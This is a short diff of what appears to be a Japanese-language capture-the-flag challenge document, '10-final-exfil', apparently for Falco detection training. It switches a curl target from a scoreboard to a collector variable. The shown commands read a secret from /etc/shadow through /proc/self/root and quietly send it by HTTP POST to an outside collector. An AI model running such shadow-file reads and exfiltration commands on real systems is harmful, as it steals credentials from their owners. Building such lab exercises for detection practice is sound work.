@@ -40,7 +40,7 @@ dev default `FALCO{dev-final-exfil}`。
 FLAG=$(grep CTF_MASTER_KEY /proc/self/root/etc/shadow | awk '{print $NF}')
 
 # 2) 既存 curl で collector へ静かに HTTP exfil
-curl -s "${FALCO_CTF_SCOREBOARD}/api/challenges/10-final-exfil/exfil" \
+curl -s "${FALCO_CTF_COLLECTOR}/api/challenges/10-final-exfil/exfil" \
   -H 'Content-Type: application/json' \
   -d "{\"user\":\"${FALCO_CTF_USER}\",\"flag\":\"${FLAG}\"}"
 #  → {"received":true,...}
